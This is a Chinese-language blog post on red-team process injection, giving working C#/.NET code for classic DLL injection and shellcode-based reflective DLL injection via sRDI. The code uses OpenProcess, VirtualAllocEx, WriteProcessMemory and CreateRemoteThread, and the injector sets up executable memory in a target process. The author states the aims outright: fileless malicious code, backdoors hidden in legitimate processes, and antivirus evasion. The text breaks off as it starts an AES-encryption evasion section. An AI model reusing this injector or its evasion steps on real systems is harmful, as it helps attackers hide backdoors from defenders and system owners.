<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="使用.NET实现DLL注入技术"><meta name="keywords" content="DLL注入"><meta name="author" content="rootrain"><meta name="copyright" content="rootrain"><title>使用.NET实现DLL注入技术 | rootrain's Home</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-进程注入是什么"><span class="toc-number">1.</span> <span class="toc-text">0x00 进程注入是什么</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-如何进程注入"><span class="toc-number">2.</span> <span class="toc-text">0x02 如何进程注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-DLL注入"><span class="toc-number">3.</span> <span class="toc-text">0x03 DLL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数介绍"><span class="toc-number">3.1.</span> <span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetProcAddress函数"><span class="toc-number">3.1.1.</span> <span class="toc-text">GetProcAddress函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenProcess函数"><span class="toc-number">3.1.2.</span> <span class="toc-text">OpenProcess函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualAllocEx函数"><span class="toc-number">3.1.3.</span> <span class="toc-text">VirtualAllocEx函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WriteProcessMemory函数"><span class="toc-number">3.1.4.</span> <span class="toc-text">WriteProcessMemory函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CreateRemoteThread函数"><span class="toc-number">3.1.5.</span> <span class="toc-text">CreateRemoteThread函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结果观察"><span class="toc-number">3.2.</span> <span class="toc-text">结果观察</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-反射型DLL注入"><span class="toc-number">4.</span> <span class="toc-text">0x04 反射型DLL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#与DLL注入的差别"><span class="toc-number">4.1.</span> <span class="toc-text">与DLL注入的差别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用shellcode进行反射DLL注入"><span class="toc-number">4.2.</span> <span class="toc-text">使用shellcode进行反射DLL注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-反射型DLL注入与免杀联动"><span class="toc-number">5.</span> <span class="toc-text">0x05 反射型DLL注入与免杀联动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用aes加密保证shellcode唯一性"><span class="toc-number">5.1.</span> <span class="toc-text">使用aes加密保证shellcode唯一性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main函数中调用解密函数和key"><span class="toc-number">5.2.</span> <span class="toc-text">main函数中调用解密函数和key</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">rootrain</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">12</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">8</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2020/02/29/BlO4umfeQ8Ao9D3.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">rootrain's Home</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives/">Archives</a><a class="site-page" href="/tags/">Tags</a><a class="site-page" href="/categories/">Categories</a></span></div><div id="post-info"><div id="post-title">使用.NET实现DLL注入技术</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-29</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/内网/">内网</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>进程注入可以在一个实时进程中插入或注入一段自定义代码。在一个进程中运行特定代码，则有可能访问该进程的内存，系统或网络资源以及提升权限。 因为执行命令需要借用某些合法进程，所以一般的进程注入都要绕过AV检测。</p>
<a id="more"></a>
<h1 id="0x00-进程注入是什么"><a href="#0x00-进程注入是什么" class="headerlink" title="0x00 进程注入是什么"></a>0x00 进程注入是什么</h1><p>进程注入可以在一个实时进程中插入或注入一段自定义代码。在一个进程中运行特定代码，则有可能访问该进程的内存，系统或网络资源以及提升权限。 因为执行命令需要借用某些合法进程，所以一般的进程注入都要绕过AV检测。</p>
<p>#0x01 进程注入能做什么</p>
<p>1.恶意文件不落地，直接将恶意代码注入到正常进程当中。</p>
<p>2.作为后门驻留在正常进程中，规避杀毒软件，迷惑权限拥有者，隐藏后门。</p>
<p>3.等等</p>
<h1 id="0x02-如何进程注入"><a href="#0x02-如何进程注入" class="headerlink" title="0x02 如何进程注入"></a>0x02 如何进程注入</h1><p>进程注入一般地有两种实现方法，一种是DLL注入，另一种是DLL反射型注入。</p>
<h1 id="0x03-DLL注入"><a href="#0x03-DLL注入" class="headerlink" title="0x03 DLL注入"></a>0x03 DLL注入</h1><p>DLL注入是一种很经典的技术，原理也比较简单。通过编写代码，可以将恶意的DLL文件注入到普通进程当中。</p>
<p>首先要介绍几个相关的函数。经典的DLL注入流程一般如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OpenProcess() //获取对象句柄</span><br><span class="line">GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;) //获取DLL内存地址</span><br><span class="line">VirtualAllocEx() //分配内存地址</span><br><span class="line">WriteProcessMemory() //写入内存</span><br><span class="line">CreateRemoteThread() //创建远程线程</span><br><span class="line">CloseHandle() //关闭对象句柄</span><br></pre></td></tr></table></figure>
<h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="GetProcAddress函数"><a href="#GetProcAddress函数" class="headerlink" title="GetProcAddress函数"></a>GetProcAddress函数</h3><p>该函数的作用是从指定的动态链接库（DLL）检索导出的函数或变量的地址。</p>
<p><strong>参数</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hModule</span><br><span class="line">包含函数或变量的DLL模块的句柄。</span><br><span class="line"></span><br><span class="line">lpProcName</span><br><span class="line">函数或变量名称，或函数的序数值。</span><br></pre></td></tr></table></figure>
<p><strong>返回值</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果函数成功，则返回值是导出的函数或变量的地址。</span><br><span class="line"></span><br><span class="line">如果函数失败，则返回值为NULL。</span><br></pre></td></tr></table></figure>
<h3 id="OpenProcess函数"><a href="#OpenProcess函数" class="headerlink" title="OpenProcess函数"></a>OpenProcess函数</h3><p>该函数的作用是打开现有的本地进程对象。</p>
<p><strong>参数</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dwDesiredAccess</span><br><span class="line">对过程对象的访问。对照该过程的安全描述符检查此访问权限。此参数可以是一个或多个 进程访问权限。如果调用者已启用SeDebugPrivilege特权，则无论安全描述符的内容如何，都将授予请求的访问权限。</span><br><span class="line"></span><br><span class="line">bInheritHandle</span><br><span class="line">如果此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程将不会继承此句柄。</span><br><span class="line"></span><br><span class="line">dwProcessId</span><br><span class="line">要打开的本地进程的标识符。</span><br><span class="line">如果指定的进程是系统进程（0x00000000），该函数将失败，并且最后的错误代码是ERROR_INVALID_PARAMETER。如果指定的进程是Idle进程或CSRSS进程之一，则此函数将失败，并且最后一个错误代码为ERROR_ACCESS_DENIED，因为它们的访问限制会阻止用户级代码打开它们。</span><br></pre></td></tr></table></figure>
<p><strong>返回值</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果函数成功，则返回值是指定进程的打开句柄。</span><br><span class="line"></span><br><span class="line">如果函数失败，则返回值为NULL。</span><br></pre></td></tr></table></figure>
<h3 id="VirtualAllocEx函数"><a href="#VirtualAllocEx函数" class="headerlink" title="VirtualAllocEx函数"></a>VirtualAllocEx函数</h3><p>该函数的作用是在指定进程的虚拟地址空间内保留，提交或更改内存区域的状态。该函数将其分配的内存初始化为零。也就是分配内存。</p>
<p><strong>参数</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">hProcess</span><br><span class="line">进程的句柄。该函数在此进程的虚拟地址空间内分配内存。</span><br><span class="line">句柄必须具有PROCESS_VM_OPERATION访问权限。有关更多信息，请参见 过程安全性和访问权限。</span><br><span class="line"></span><br><span class="line">lpAddress</span><br><span class="line">该指针为要分配的页面区域指定所需的起始地址。</span><br><span class="line">如果要保留内存，则该函数会将地址四舍五入到分配粒度的最接近倍数。</span><br><span class="line">如果提交的是已保留的内存，则该函数会将此地址四舍五入到最接近的页面边界。要确定页面的大小和主机上的分配粒度，请使用 GetSystemInfo函数。</span><br><span class="line">如果lpAddress为NULL，则该函数确定将区域分配到的位置。</span><br><span class="line">如果此地址位于尚未通过调用InitializeEnclave初始化的安全区内，则VirtualAllocEx会在该地址为安全区分配一个零页。该页面必须先前未提交，并且不会使用英特尔软件保护扩展编程模型的EEXTEND指令进行测量。</span><br><span class="line">如果地址在您初始化的安全区内，则分配操作将失败，并出现ERROR_INVALID_ADDRESS错误。</span><br><span class="line"></span><br><span class="line">dwSize</span><br><span class="line">要分配的内存区域的大小，以字节为单位。</span><br><span class="line">如果lpAddress为NULL，则该函数 会将dwSize向上舍入到下一个页面边界。</span><br><span class="line">如果lpAddress不为NULL，则该函数分配从lpAddress到 lpAddress + dwSize范围内包含一个或多个字节的所有页面。例如，这意味着跨越页面边界的2字节范围会导致函数分配两个页面。</span><br><span class="line"></span><br><span class="line">flAllocationType</span><br><span class="line">内存分配的类型。</span><br><span class="line"></span><br><span class="line">flProtect</span><br><span class="line">对要分配的页面区域的内存保护。</span><br></pre></td></tr></table></figure>
<p><strong>返回值</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果函数成功，则返回值是页面分配区域的基地址。</span><br><span class="line"></span><br><span class="line">如果函数失败，则返回值为NULL。</span><br></pre></td></tr></table></figure>
<h3 id="WriteProcessMemory函数"><a href="#WriteProcessMemory函数" class="headerlink" title="WriteProcessMemory函数"></a>WriteProcessMemory函数</h3><p>这个函数的作用是在指定的进程中将数据写入内存区域。必须写入整个区域，否则操作将失败。</p>
<p><strong>参数</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hProcess</span><br><span class="line">要修改的过程存储器的句柄。句柄必须具有对进程的PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问。</span><br><span class="line"></span><br><span class="line">lpBaseAddress</span><br><span class="line">指向指定过程的基地址的指针，数据将写入该过程中。在进行数据传输之前，系统会验证基址和指定大小的内存中的所有数据是否可访问以进行写访问，如果无法访问，则该功能将失败。</span><br><span class="line"></span><br><span class="line">lpBuffer</span><br><span class="line">指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据。</span><br><span class="line"></span><br><span class="line">nSize</span><br><span class="line">要写入指定进程的字节数。</span><br><span class="line"></span><br><span class="line">lpNumberOfBytesWritten</span><br><span class="line">指向变量的指针，该变量接收传输到指定进程中的字节数。此参数是可选的。如果lpNumberOfBytesWritten为NULL，则忽略该参数。</span><br></pre></td></tr></table></figure>
<p><strong>返回值</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果函数成功，则返回值为非零。</span><br><span class="line"></span><br><span class="line">如果函数失败，则返回值为0。</span><br></pre></td></tr></table></figure>
<h3 id="CreateRemoteThread函数"><a href="#CreateRemoteThread函数" class="headerlink" title="CreateRemoteThread函数"></a>CreateRemoteThread函数</h3><p>创建一个在另一个进程的虚拟地址空间中运行的线程。</p>
<p><strong>参数</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">hProcess</span><br><span class="line">要在其中创建线程的进程的句柄。该句柄必须具有PROCESS_CREATE_THREAD，PROCESS_QUERY_INFORMATION，PROCESS_VM_OPERATION，PROCESS_VM_WRITE和PROCESS_VM_READ访问权限，并且在某些平台上没有这些权限可能会失败。有关更多信息，请参见 过程安全性和访问权限。</span><br><span class="line"></span><br><span class="line">lpThreadAttributes</span><br><span class="line">指向SECURITY_ATTRIBUTES结构的指针，该 结构为新线程指定安全描述符，并确定子进程是否可以继承返回的句柄。如果lpThreadAttributes为NULL，则线程获取默认的安全描述符，并且该句柄无法继承。线程的默认安全描述符中的访问控制列表（ACL）来自创建者的主要令牌。</span><br><span class="line">Windows XP：  线程的默认安全描述符中的ACL来自创建者的主令牌或模拟令牌。对于带有SP2的Windows XP和Windows Server 2003，此行为已更改。</span><br><span class="line"></span><br><span class="line">dwStackSize</span><br><span class="line">堆栈的初始大小，以字节为单位。系统将此值舍入到最接近的页面。如果此参数为0（零），则新线程将使用可执行文件的默认大小。有关更多信息，请参见 线程堆栈大小。</span><br><span class="line"></span><br><span class="line">lpStartAddress</span><br><span class="line">指向由线程执行的，类型为LPTHREAD_START_ROUTINE的应用程序定义的函数的指针，该指针表示远程进程中线程的起始地址。该功能必须存在于远程进程中。</span><br><span class="line"></span><br><span class="line">lpParameter</span><br><span class="line">指向要传递给线程函数的变量的指针。</span><br><span class="line"></span><br><span class="line">dwCreationFlags</span><br><span class="line">控制线程创建的标志。</span><br><span class="line"></span><br><span class="line">lpThreadId</span><br><span class="line">指向接收线程标识符的变量的指针。</span><br><span class="line">如果此参数为NULL，则不返回线程标识符。</span><br></pre></td></tr></table></figure>
<p><strong>返回值</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果函数成功，则返回值是新线程的句柄。</span><br><span class="line"></span><br><span class="line">如果函数失败，则返回值为NULL。</span><br></pre></td></tr></table></figure>
<p>然后我们来看一下怎么使用.NET去实现它。</p>
<p>首先，要用到上面的函数，我们就要先声明API</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]</span><br><span class="line">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true, ExactSpelling = true)]</span><br><span class="line">    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">    static extern IntPtr CreateRemoteThread(IntPtr hProcess,</span><br><span class="line">        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line"></span><br><span class="line">    // privileges</span><br><span class="line">    const int PROCESS_CREATE_THREAD = 0x0002;</span><br><span class="line">    const int PROCESS_QUERY_INFORMATION = 0x0400;</span><br><span class="line">    const int PROCESS_VM_OPERATION = 0x0008;</span><br><span class="line">    const int PROCESS_VM_WRITE = 0x0020;</span><br><span class="line">    const int PROCESS_VM_READ = 0x0010;</span><br><span class="line"></span><br><span class="line">    // used for memory allocation</span><br><span class="line">    const uint MEM_COMMIT = 0x00001000;</span><br><span class="line">    const uint MEM_RESERVE = 0x00002000;</span><br><span class="line">    const uint PAGE_READWRITE = 4;</span><br></pre></td></tr></table></figure>
<p>声明后，我们就可以直接使用这些函数。</p>
<p><strong>获取进程ID</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process targetProcess = Process.GetProcessesByName(&quot;notepad&quot;)[0];</span><br></pre></td></tr></table></figure>
<p><strong>获取句柄</strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);</span><br></pre></td></tr></table></figure>
<p><strong>获取DLL的地址</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);</span><br></pre></td></tr></table></figure>
<p><strong>分配内存地址</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br></pre></td></tr></table></figure>
<p><strong>写入内存</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);</span><br></pre></td></tr></table></figure>
<p><strong>创建远程线程</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);</span><br></pre></td></tr></table></figure>
<h2 id="结果观察"><a href="#结果观察" class="headerlink" title="结果观察"></a>结果观察</h2><p>使用process hacker或者process explorer观察，我们可以看到执行dll注入的效果。注入notepad进程后，会在其进程下执行一个rundll32，并最终成功执行dll里面的函数，触发弹出计算器。</p>
<p><img src="/images/使用.NET实现注入技术/image-20200205184704212.png" alt></p>
<p>在实战过程中，我们可以通过这种方法将DLL注入到正常文件中。需要注意的是，使用的DLL需要在DllMain中定义你的操作。</p>
<h1 id="0x04-反射型DLL注入"><a href="#0x04-反射型DLL注入" class="headerlink" title="0x04 反射型DLL注入"></a>0x04 反射型DLL注入</h1><p>对于常规型的DLL注入来说，有着非常大的缺陷，最明显的是它需要LoadLibrary对DLL文件进行加载，这无疑增加了文件的体积，便利性也大大降低。因此有了一种新的（误）DLL注入技术–反射型DLL注入。</p>
<h2 id="与DLL注入的差别"><a href="#与DLL注入的差别" class="headerlink" title="与DLL注入的差别"></a>与DLL注入的差别</h2><p>说到反射型DLL注入，肯定要理解他们的差别在哪里。</p>
<p>反射DLL注入可以将加密的DLL保存在磁盘（或者以其他形式如shellcode等），之后将其解密放在内存中。之后跟DLL注入一般，使用VirtualAlloc和WriteProcessMemory将DLL写入目标进程。因为没有使用LoadLibrary函数，要想实现DLL的加载运行，我们需要在DLL中添加一个导出函数，ReflectiveLoader，这个函数实现的功能就是加载自身。</p>
<p>反射DLL注入实现起来其实十分复杂，需要对PE加载十分了解。通过编写ReflectiveLoader找到DLL文件在内存中的地址，分配装载DLL的空间，并计算 DLL 中用于执行反射加载的导出的内存偏移量，然后通过偏移地址作为入口调用 CreateRemoteThread函数执行。</p>
<h2 id="使用shellcode进行反射DLL注入"><a href="#使用shellcode进行反射DLL注入" class="headerlink" title="使用shellcode进行反射DLL注入"></a>使用shellcode进行反射DLL注入</h2><p>那有没有更简便的方法呢？回答是有。那就是<a href="https://github.com/monoxgas/sRDI" target="_blank" rel="noopener">sRDI</a>，使用Shellcode进行反射DLL注入。sRDI在可以将任意DLL转换成无依赖的shellcode，使用shellcode注入技术便可以执行DLL中的功能，因为ReflectiveLoader在shellcode中实现，无需在你在DLL中实现该代码。</p>
<p>烦人的步骤sRDI已经帮我们解决掉了，那么我们很快就可以利用该技术进行反射DLL注入。</p>
<p><strong>将dll文件转换成shellcode</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ConvertToShellcode.py calc.dll</span><br></pre></td></tr></table></figure>
<p>执行完后将会返回一个同名bin文件</p>
<p><strong>将二进制转换成十六进制（0x）</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -v -e &apos;1/1 &quot;0x%02x,&quot;&apos; calc.bin | sed &apos;s/.$//&apos; &gt; calc.txt</span><br></pre></td></tr></table></figure>
<p>这将会输出很长的十六进制到calc.txt</p>
<p>跟DLL注入一样，直接写入内存就可以完成DLL的注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public static void ReflectiveDLLInject(int targetId, byte[] shellcode)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;</span><br><span class="line">                IntPtr lpThreadId = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);</span><br><span class="line">                Console.WriteLine($&quot;[+] Getting the handle for the target process: &#123;procHandle&#125;.&quot;);</span><br><span class="line">                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">                Console.WriteLine($&quot;[+] Allocating memory in the remote process &#123;remoteAddr&#125;.&quot;);</span><br><span class="line">                Console.WriteLine($&quot;[+] Writing shellcode at the allocated memory location.&quot;);</span><br><span class="line">                if (WriteProcessMemory(procHandle, remoteAddr, shellcode, (uint)shellcode.Length, out lpNumberOfBytesWritten))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine($&quot;[+] Shellcode written in the remote process.&quot;);</span><br><span class="line">                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine($&quot;[+] Failed to inject shellcode.&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/使用.NET实现注入技术/image-20200207144912193.png" alt></p>
<h1 id="0x05-反射型DLL注入与免杀联动"><a href="#0x05-反射型DLL注入与免杀联动" class="headerlink" title="0x05 反射型DLL注入与免杀联动"></a>0x05 反射型DLL注入与免杀联动</h1><p>回顾文章<a href="http://red.dbappsecurity.com.cn/#/book?id=547" target="_blank" rel="noopener">免杀的一些思路与小结</a>，我们只需要简单改一下代码便可以实现一些免杀效果。</p>
<h2 id="使用aes加密保证shellcode唯一性"><a href="#使用aes加密保证shellcode唯一性" class="headerlink" title="使用aes加密保证shellcode唯一性"></a>使用aes加密保证shellcode唯一性</h2><p>首先使用aes加密函数加密shellcode，在DLL注入时再解密执行。</p>
